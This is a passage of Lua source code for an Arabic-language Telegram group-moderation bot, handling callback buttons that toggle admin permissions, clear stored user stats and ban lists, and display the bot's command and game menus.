bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, 1 ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum4//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum4//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(chat_id,UserId[2]).invite_users) == 1 then
bot.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,nil,'❬ ❌ ❭',nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, 0, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
else
bot.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,nil,'❬ ✔️ ❭',nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, 1, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum5//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum5//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(chat_id,UserId[2]).delete_messages) == 1 then
bot.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه مسح الرسائل", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,nil,nil,'❬ ❌ ❭',nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, 0, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
else
bot.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه مسح الرسائل", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,nil,nil,'❬ ✔️ ❭',nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, 1, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum6//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum6//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(chat_id,UserId[2]).promote) == 1 then
bot.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,nil,nil,nil,'❬ ❌ ❭')
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, 0})
else
bot.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,nil,nil,nil,'❬ ✔️ ❭')
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, 1})
end
end
end
if Text and Text:match("^delforme_(.*)_(.*)") then
local infomsg = {Text:match("^delforme_(.*)_(.*)")}
local userid = infomsg[1]
local Type  = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(userid) then  
return bot.answerCallbackQuery(data.id,"↯ عذرا الامر لا يخصك ", true)
end
if Type == "1" then
redis:del(bot_id..":"..chat_id..":"..user_id..":message")
yrv = "رسائلك"
elseif Type == "2" then
redis:del(bot_id..":"..chat_id..":"..user_id..":Editmessage")
yrv = "سحكاتك"
elseif Type == "3" then
redis:del(bot_id..":"..chat_id..":"..user_id..":Addedmem")
yrv = "جهاتك"
elseif Type == "4" then
redis:del(bot_id..":"..chat_id..":"..user_id..":game")
yrv = "نقاطك"
end
bot.answerCallbackQuery(data.id,"تم مسح "..yrv.." بنجاح .", true)
end
if Text and Text:match("^iforme_(.*)_(.*)") then
local infomsg = {Text:match("^iforme_(.*)_(.*)")}
local userid = infomsg[1]
local Type  = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(userid) then  
return bot.answerCallbackQuery(data.id,"↯ عذرا الامر لا يخصك ", true)
end
if Type == "1" then
yrv = "رسائلك"
elseif Type == "2" then
yrv = "سحكاتك"
elseif Type == "3" then
yrv = "جهاتك"
elseif Type == "4" then
yrv = "نقاطك"
end
bot.answerCallbackQuery(data.id,"شستفاديت عود من شفت "..yrv.." بس كلي .", true)
end
if Text and Text:match("^mn_(.*)_(.*)") then
local infomsg = {Text:match("^mn_(.*)_(.*)")}
local userid = infomsg[1]
local Type  = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(userid) then  
return bot.answerCallbackQuery(data.id,"• عذراً الامر لا يخصك ", true)
end
if Type == "st" then  
ty =  "الملصقات الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Sticker"..data.chat_id)  
t = "• قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"• قائمه "..ty.." فارغه ", true)
end  
bot.answerCallbackQuery(data.id,"• تم مسحها ", true)
redis:del(bot_id.."mn:content:Sticker"..data.chat_id) 
elseif Type == "tx" then  
ty =  "الكلمات الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Text"..data.chat_id)  
t = "• قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"• قائمه "..ty.." فارغه ", true)
end  
bot.answerCallbackQuery(data.id,"• تم مسحها ", true)
redis:del(bot_id.."mn:content:Text"..data.chat_id) 
elseif Type == "gi" then  
 ty =  "المتحركه الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Animation"..data.chat_id)  
t = "• قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"• قائمه "..ty.." فارغه ", true)
end  
bot.answerCallbackQuery(data.id,"• تم مسحها ", true)
redis:del(bot_id.."mn:content:Animation"..data.chat_id) 
elseif Type == "ph" then  
ty =  "الصور الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Photo"..data.chat_id) 
t = "• قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"• قائمه "..ty.." فارغه ", true)
end  
bot.answerCallbackQuery(data.id,"• تم مسحها ", true)
redis:del(bot_id.."mn:content:Photo"..data.chat_id) 
elseif Type == "up" then  
local Photo =redis:scard(bot_id.."mn:content:Photo"..data.chat_id) 
local Animation =redis:scard(bot_id.."mn:content:Animation"..data.chat_id)  
local Sticker =redis:scard(bot_id.."mn:content:Sticker"..data.chat_id)  
local Text =redis:scard(bot_id.."mn:content:Text"..data.chat_id)  
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = 'الصور الممنوعه', data="mn_"..data.sender_user_id.."_ph"},{text = 'الكلمات الممنوعه', data="mn_"..data.sender_user_id.."_tx"}},
{{text = 'المتحركه الممنوعه', data="mn_"..data.sender_user_id.."_gi"},{text = 'الملصقات الممنوعه',data="mn_"..data.sender_user_id.."_st"}},
{{text = 'تحديث',data="mn_"..data.sender_user_id.."_up"}},
}
}
bot.editMessageText(chat_id,msg_id,"*• تحوي قائمه المنع على :\n• الصور ( "..Photo.." )\n• الكلمات ( "..Text.." )\n• الملصقات ( "..Sticker.." )\n• المتحركه ( "..Animation.." )\n• اضغط على القائمه المراد مسحها*", 'md', true, false, reply_markup)
bot.answerCallbackQuery(data.id,"تم تحديث النتائج", true)
end
end
if Text == 'EndAddarrayy'..user_id then  
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}},
}
}
if redis:get(bot_id..'Set:arrayy'..user_id..':'..chat_id) == 'true1' then
redis:del(bot_id..'Set:arrayy'..user_id..':'..chat_id)
bot.editMessageText(chat_id,msg_id,"*• تم حفظ الردود *", 'md', true, false, reply_markup)
else
bot.editMessageText(chat_id,msg_id,"*• تم تنفيذ الامر سابقاًً*", 'md', true, false, reply_markup)
end
end
if Text == 'EndAddarray'..user_id then  
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}},
}
}
if redis:get(bot_id..'Set:array'..user_id..':'..chat_id) == 'true1' then
redis:del(bot_id..'Set:array'..user_id..':'..chat_id)
bot.editMessageText(chat_id,msg_id,"*• تم حفظ الردود *", 'md', true, false, reply_markup)
else
bot.editMessageText(chat_id,msg_id,"*• تم تنفيذ الامر سابقاًً*", 'md', true, false, reply_markup)
end
end
if Text and Text:match("^Sur_(.*)_(.*)") then
local infomsg = {Text:match("^Sur_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
return false
end   
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}},
}
}
if tonumber(infomsg[2]) == 1 then
if GetInfoBot(data).BanUser == false then
bot.editMessageText(chat_id,msg_id,"*• لا يمتلك البوت صلاحيه حظر الاعضاء*", 'md', true, false, reply_markup)
return false
end   
if not Isrank(data.sender_user_id,chat_id) then
t = "*• لا يمكن للبوت حظر "..Get_Rank(data.sender_user_id,chat_id).."*"
else
t = "*• تم طردك *"
bot.setChatMemberStatus(chat_id,data.sender_user_id,'banned',0)
end
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_markup)
elseif tonumber(infomsg[2]) == 2 then
bot.editMessageText(chat_id,msg_id,"*• تم الغاء عمليه الطرد*", 'md', true, false, reply_markup)
end
end

if Text and Text:match("^Amr_(.*)_(.*)") then
local infomsg = {Text:match("^Amr_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
return false
end   
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "او٘اﻣـࢪ اﺂݪـﺣَـﻣـاﯾـه" ,data="Amr_"..data.sender_user_id.."_1"},{text = "او٘اﻣـࢪ اݪادمني٘ـه",data="Amr_"..data.sender_user_id.."_2"}},
{{text = "او٘اﻣـࢪ اݪمدࢪا۽",data="Amr_"..data.sender_user_id.."_3"},{text ="او٘اﻣـࢪ اݪمـنشئي٘ن",data="Amr_"..data.sender_user_id.."_4"}},
{{text ="او٘اﻣـࢪ اݪمطۅࢪي٘ن",data="Amr_"..data.sender_user_id.."_5"},{text ="او٘اﻣـࢪ اݪاعٓظاء",data="Amr_"..data.sender_user_id.."_6"}},
{{text ="العاب البوت",data="Amr_"..data.sender_user_id.."_7"}},




}
}
if infomsg[2] == '1' then
reply_markup = reply_markup
t = "*⌁︙اوامر حماية المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙قفل • فتح ↫ الروابط\n⌁︙قفل • فتح ↫ المعرفات\n⌁︙قفل • فتح ↫ البوتات\n⌁︙قفل • فتح ↫ المتحركه\n⌁︙قفل • فتح ↫ الملصقات\n⌁︙قفل • فتح ↫ الملفات\n⌁︙قفل • فتح ↫ الصور\n⌁︙قفل • فتح ↫ الفيديو\n⌁︙قفل • فتح ↫ الاونلاين\n⌁︙قفل • فتح ↫ الدردشه\n⌁︙قفل • فتح ↫ التوجيه\n⌁︙قفل • فتح ↫ الاغاني\n⌁︙قفل • فتح ↫ الصوت\n⌁︙قفل • فتح ↫ الجهات\n⌁︙قفل • فتح ↫ الماركداون\n⌁︙قفل • فتح ↫ التكرار\n⌁︙قفل • فتح ↫ الهاشتاك\n⌁︙قفل • فتح ↫ التعديل\n⌁︙قفل • فتح ↫ الاباحي\n⌁︙قفل • فتح ↫ التثبيت\n⌁︙قفل • فتح ↫ الاشعارات\n⌁︙قفل • فتح ↫ الكلايش\n⌁︙قفل • فتح ↫ الدخول\n⌁︙قفل • فتح ↫ الشبكات\n⌁︙قفل • فتح ↫ المواقع\n⌁︙قفل • فتح ↫ الفشار\n⌁︙قفل • فتح ↫ الكفر\n⌁︙قفل • فتح ↫ الطائفيه\n⌁︙قفل • فتح ↫ الكل\n⌁︙قفل • فتح ↫ العربيه\n⌁︙قفل • فتح ↫ الانكليزيه\n⌁︙قفل • فتح ↫ الفارسيه\n⌁︙قفل • فتح ↫ التفليش\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر حمايه اخرى ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙قفل • فتح + الامر ↫ ⤈\n⌁︙التكرار بالطرد\n⌁︙التكرار بالكتم\n⌁︙التكرار بالتقيد\n⌁︙الفارسيه بالطرد\n⌁︙البوتات بالطرد\n⌁︙البوتات بالتقيد\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*"
elseif infomsg[2] == '2' then
reply_markup = reply_markup
t = "*\n⌁︙اوامر الادمنيه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الاعدادت\n⌁︙تاك للكل \n⌁︙انشاء رابط\n⌁︙ضع وصف\n⌁︙ضع رابط\n⌁︙ضع صوره\n⌁︙حذف الرابط\n⌁︙حذف المطايه\n⌁︙كشف البوتات\n⌁︙طرد البوتات\n⌁︙تنظيف + العدد\n⌁︙تنظيف التعديل\n⌁︙كللهم + الكلمه\n⌁︙اسم البوت + الامر\n⌁︙ضع • حذف ↫ ترحيب\n⌁︙ضع • حذف ↫ قوانين\n⌁︙اضف • حذف ↫ صلاحيه\n⌁︙الصلاحيات • حذف الصلاحيات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ضع سبام + العدد\n⌁︙ضع تكرار + العدد\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رفع مميز • تنزيل مميز\n⌁︙المميزين • حذف المميزين\n⌁︙كشف القيود • رفع القيود\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف • مسح + بالرد\n⌁︙منع • الغاء منع\n⌁︙قائمه المنع\n⌁︙حذف قائمه المنع\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تفعيل • تعطيل ↫ الرابط\n⌁︙تفعيل • تعطيل ↫ الالعاب\n⌁︙تفعيل • تعطيل ↫ الترحيب\n⌁︙تفعيل • تعطيل ↫ التاك للكل\n⌁︙تفعيل • تعطيل ↫ كشف الاعدادات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙طرد المحذوفين\n⌁︙طرد ↫ بالرد • بالمعرف • بالايدي\n⌁︙كتم • الغاء كتم\n⌁︙تقيد • الغاء تقيد\n⌁︙حظر • الغاء حظر\n⌁︙المكتومين • حذف المكتومين\n⌁︙المقيدين • حذف المقيدين\n⌁︙المحظورين • حذف المحظورين\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تقييد دقيقه + عدد الدقائق\n⌁︙تقييد ساعه + عدد الساعات\n⌁︙تقييد يوم + عدد الايام\n⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*"
elseif infomsg[2] == '3' then
reply_markup = reply_markup
t = "*⌁︙اوامر المدراء ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙فحص البوت\n⌁︙ضع اسم + الاسم\n⌁︙اضف • حذف ↫ رد\n⌁︙ردود المدير\n⌁︙حذف ردود المدير\n⌁︙اضف • حذف ↫ رد متعدد\n⌁︙حذف رد من متعدد\n⌁︙الردود المتعدده\n⌁︙حذف الردود المتعدده\n⌁︙حذف قوائم المنع\n⌁︙منع ↫ بالرد على ( ملصق • صوره • متحركه )\n⌁︙حذف قائمه منع + ↫ ⤈\n( الصور • المتحركات • الملصقات )\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تنزيل الكل\n⌁︙رفع ادمن • تنزيل ادمن\n⌁︙الادمنيه • حذف الادمنيه\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تثبيت\n⌁︙الغاء التثبيت\n⌁︙اعاده التثبيت\n⌁︙الغاء تثبيت الكل\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تغير رد + اسم الرتبه + النص ↫ ⤈\n⌁︙المطور • منشئ الاساسي\n⌁︙المنشئ • المدير • الادمن\n⌁︙المميز • المنظف • العضو\n⌁︙حذف ردود الرتب\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تغيير الايدي ↫ لتغيير الكليشه\n⌁︙تعيين الايدي ↫ لتعيين الكليشه\n⌁︙حذف الايدي ↫ لحذف الكليشه\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تفعيل • تعطيل + الامر ↫ ⤈\n⌁︙اطردني • الايدي بالصوره • الابراج\n⌁︙معاني الاسماء • اوامر النسب • انطق\n⌁︙الايدي • تحويل الصيغ • اوامر التحشيش\n⌁︙ردود المدير • ردود المطور • التحقق\n⌁︙ضافني • حساب العمر • الزخرفه\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*"
elseif infomsg[2] == '4' then
reply_markup = reply_markup
t = "*⌁︙اوامر المنشئين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تنزيل الكل\n⌁︙الميديا • امسح\n⌁︙تعين عدد الحذف\n⌁︙ترتيب الاوامر\n⌁︙اضف • حذف ↫ امر\n⌁︙حذف الاوامر المضافه\n⌁︙الاوامر المضافه\n⌁︙اضف نقاط ↫ بالرد • بالايدي\n⌁︙اضف رسائل ↫ بالرد • بالايدي\n⌁︙رفع منظف • تنزيل منظف\n⌁︙المنظفين • حذف المنظفين\n⌁︙رفع مدير • تنزيل مدير\n⌁︙المدراء • حذف المدراء\n⌁︙تفعيل • تعطيل + الامر ↫ ⤈\n⌁︙نزلني • امسح\n⌁︙الحظر • الكتم\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر المنشئين الاساسيين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙وضع لقب + اللقب\n⌁︙تفعيل • تعطيل ↫ الرفع\n⌁︙رفع منشئ • تنزيل منشئ\n⌁︙المنشئين • حذف المنشئين\n⌁︙رفع • تنزيل ↫ مشرف\n⌁︙رفع بكل الصلاحيات\n⌁︙حذف القوائم\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر المالكين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رفع • تنزيل ↫ منشئ اساسي\n⌁︙حذف المنشئين الاساسيين \n⌁︙المنشئين الاساسيين \n⌁︙حذف جميع الرتب\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*"
elseif infomsg[2] == '5' then
reply_markup = reply_markup
t = "*⌁︙اوامر المطورين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الكروبات\n⌁︙المطورين\n⌁︙المشتركين\n⌁︙الاحصائيات\n⌁︙المجموعات\n⌁︙اسم البوت + غادر\n⌁︙اسم البوت + تعطيل\n⌁︙كشف + -ايدي المجموعه\n⌁︙رفع مالك • تنزيل مالك\n⌁︙المالكين • حذف المالكين\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رفع • تنزيل ↫ مدير عام\n⌁︙حذف • المدراء العامين \n⌁︙رفع • تنزيل ↫ ادمن عام\n⌁︙حذف • الادمنيه العامين \n⌁︙رفع • تنزيل ↫ مميز عام\n⌁︙حذف • المميزين عام \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر المطور الاساسي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تحديث\n⌁︙الملفات\n⌁︙المتجر\n⌁︙السيرفر\n⌁︙روابط الكروبات\n⌁︙تحديث السورس\n⌁︙تنظيف الكروبات\n⌁︙تنظيف المشتركين\n⌁︙حذف جميع الملفات\n⌁︙تعيين الايدي العام\n⌁︙تغير المطور الاساسي\n⌁︙حذف معلومات الترحيب\n⌁︙تغير معلومات الترحيب\n⌁︙غادر + -ايدي المجموعه\n⌁︙تعيين عدد الاعضاء + العدد\n⌁︙حظر عام • الغاء العام\n⌁︙كتم عام • الغاء العام\n⌁︙قائمه العام • حذف قائمه العام\n⌁︙وضع • حذف ↫ اسم البوت\n⌁︙اضف • حذف ↫ رد عام\n⌁︙ردود المطور • حذف ردود المطور\n⌁︙تعيين • حذف • جلب ↫ رد الخاص\n⌁︙جلب نسخه الكروبات\n⌁︙رفع النسخه + بالرد على الملف\n⌁︙تعيين • حذف ↫ قناة الاشتراك\n⌁︙جلب كليشه الاشتراك\n⌁︙تغيير • حذف ↫ كليشه الاشتراك\n⌁︙رفع • تنزيل ↫ مطور\n⌁︙المطورين • حذف المطورين\n⌁︙رفع • تنزيل ↫ مطور ثانوي\n⌁︙الثانويين • حذف الثانويين\n⌁︙تعيين • حذف ↫ كليشة الايدي\n⌁︙اذاعه للكل بالتوجيه ↫ بالرد\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تفعيل ملف + اسم الملف\n⌁︙تعطيل ملف + اسم الملف\n⌁︙تفعيل • تعطيل + الامر ↫ ⤈\n⌁︙الاذاعه • الاشتراك الاجباري\n⌁︙ترحيب البوت • المغادره\n⌁︙البوت الخدمي • التواصل*"
elseif infomsg[2] == '6' then
reply_markup = reply_markup
t = "*• اوامر التسليه \n *━━━━━━━━━━━ *\n• الالعاب \n• الالعاب الاحترافيه\n• برج اسم برجك \n• ━━━━━━━━━━━ \n• رفع طلي \n• رفع غبي \n• رفع بقره \n• رفع جلب \n• الجلاب \n• البقرات \n• الطليان \n• الاغبياء \n• ━━━━━━━━━━━  \n• زخرفه النص\n• احسب عمرك\n• بحث + اسم الاغنية\n• ثنائي\n• فلم\n• غنيلي\n• تحدي\n• زوجيني\n• صورتي\n• استوري\n• ميمز \n• كولي + كلام\n• متحركه\n• صوره\n• افتارات عيال\n• افتارات بنات\n• تتزوجيني\n•منو اني \n• قولي - الكلام \n• كت تويت\n• ٴId\n• همسه\n• صراحه\n• لو خيروك\n• نادي المطور\n• يوزري\n• انطقي + كلام\n• البايو\n• شخصيتي\n• لقبي\n• ايديي\n• مسح نقاطي \n• نقاطي\n• مسح رسائلي \n• رسائلي\n• مسح جهاتي \n• تفاعلي\n• جهاتي\n• مسح تعديلاتي \n• تعديلاتي  \n• معلوماتي \n• التاريخ/الساعه \n• رابط الحذف\n• جمالي\n• نسبه الحب - الكره\n• نسبه الذكاء - الغباء \n• نسبه الرجوله - الانوثه\n*"
elseif infomsg[2] == '8' then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "الكيبورد" ,data="GetSe_"..user_id.."_Keyboard"},{text = GetSetieng(chat_id).Keyboard ,data="GetSe_"..user_id.."_Keyboard"}},
{{text = "الملصقات" ,data="GetSe_"..user_id.."_messageSticker"},{text =GetSetieng(chat_id).messageSticker,data="GetSe_"..user_id.."_messageSticker"}},
{{text = "الاغاني" ,data="GetSe_"..user_id.."_messageVoiceNote"},{text =GetSetieng(chat_id).messageVoiceNote,data="GetSe_"..user_id.."_messageVoiceNote"}},
{{text = "الانكليزي" ,data="GetSe_"..user_id.."_WordsEnglish"},{text =GetSetieng(chat_id).WordsEnglish,data="GetSe_"..user_id.."_WordsEnglish"}},
{{text = "الفارسيه" ,data="GetSe_"..user_id.."_WordsPersian"},{text =GetSetieng(chat_id).WordsPersian,data="GetSe_"..user_id.."_WordsPersian"}},
{{text = "الدخول" ,data="GetSe_"..user_id.."_JoinByLink"},{text =GetSetieng(chat_id).JoinByLink,data="GetSe_"..user_id.."_JoinByLink"}},
{{text = "الصور" ,data="GetSe_"..user_id.."_messagePhoto"},{text =GetSetieng(chat_id).messagePhoto,data="GetSe_"..user_id.."_messagePhoto"}},
{{text = "الفيديو" ,data="GetSe_"..user_id.."_messageVideo"},{text =GetSetieng(chat_id).messageVideo,data="GetSe_"..user_id.."_messageVideo"}},
{{text = "الجهات" ,data="GetSe_"..user_id.."_messageContact"},{text =GetSetieng(chat_id).messageContact,data="GetSe_"..user_id.."_messageContact"}},
{{text = "السيلفي" ,data="GetSe_"..user_id.."_messageVideoNote"},{text =GetSetieng(chat_id).messageVideoNote,data="GetSe_"..user_id.."_messageVideoNote"}},
{{text = "'➡️'" ,data="GetSeBk_"..user_id.."_1"}},
}
}
bot.editMessageText(chat_id,msg_id,"التفعيل - التعطيل","md", true, false, false, false, reply_markup)
elseif infomsg[2] == '7' then
reply_markup = reply_markup
t = "• قائمة العاب البوت\n━━━━━━━━━━━\n• لعبة البنك ~⪼ بنك\n• لعبة حجرة ورقة مقص ~⪼ حجره\n• لعبة الرياضه ~⪼ رياضه\n• لعبة معرفة الصورة ~⪼ صور\n• لعبة معرفة الموسيقى ~⪼ موسيقى\n• لعبة المشاهير ~⪼ مشاهير\n• لعبة المختلف ~⪼ المختلف\n• لعبة الامثله ~⪼ امثله\n• لعبة العكس ~⪼ العكس\n• لعبة الحزوره ~⪼ حزوره\n• لعبة المعاني ~⪼ معاني\n• لعبة البات ~⪼ بات\n• لعبة التخمين ~⪼ خمن\n• لعبه الاسرع ~⪼ الاسرع\n• لعبه الترجمه ~⪼ انكليزي\n• لعبه الاسئله ~⪼ اسئله\n• لعبه تفكيك الكلمه ~⪼ تفكيك\n• لعبه تركيب الكلمه ~⪼ تركيب\n• لعبه الرياضيات ~⪼ رياضيات\n• لعبة السمايلات ~⪼ سمايلات\n• لعبة العواصم ~⪼ العواصم\n• لعبة الارقام ~⪼ ارقام\n• لعبة الحروف ~⪼ حروف\n• لعبة الاسئلة ~⪼ كت تويت\n• لعبة الاعلام والدول ~⪼ اعلام\n• لعبة الصراحه ~⪼ صراحه\n• لعبة الروليت ~⪼ روليت\n• لعبة احكام ~⪼ احكام\n• لعبة العقاب ~⪼ عقاب\n• لعبة الكلمات ~⪼ كلمات\n━━━━━━━━━━━\n• نقاطي ~⪼ لعرض عدد نقاطك\n• بيع نقاطي + العدد ~ لبيع كل نقطه مقابل 50 رساله"
elseif infomsg[2] == '9' then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "او٘اﻣـࢪ اﺂݪـﺣَـﻣـاﯾـه" ,data="Amr_"..msg.sender.user_id.."_1"},{text = "او٘اﻣـࢪ اݪادمني٘ـه",data="Amr_"..msg.sender.user_id.."_2"}},
{{text = "او٘اﻣـࢪ اݪمدࢪا۽",data="Amr_"..msg.sender.user_id.."_3"},{text ="او٘اﻣـࢪ اݪمـنشئي٘ن",data="Amr_"..msg.sender.user_id.."_4"}},
{{text = "او٘اﻣـࢪ اݪمطۅࢪي٘ن",data="Amr_"..msg.sender.user_id.."_5"},{text ="او٘اﻣـࢪ اݪاعٓظاء",data="Amr_"..msg.sender.user_id.."_6"}},
{{text ="العاب البوت",data="Amr_"..msg.sender.user_id.."_7"}},
{{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}},
}
}
t = "*• قائمه الاوامر \n *━━━━━━━━━━━ *\n• م1 ( اوامر القفل - الفتح ) \n• م2 ( اوامر اعدادات المجموعة ) \n• م3 ( اوامر التفعيل والتعطيل ) \n• م4 ( اوامر التسليه ) *"
end
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_markup)
end

----------------------------------------------------------------------------------------------------
if Text and Text:match("^GetSeBk_(.*)_(.*)") then
local infomsg = {Text:match("^GetSeBk_(.*)_(.*)")}
num = tonumber(infomsg[1])
any = tonumber(infomsg[2])
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
return false
end  
if any == 0 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
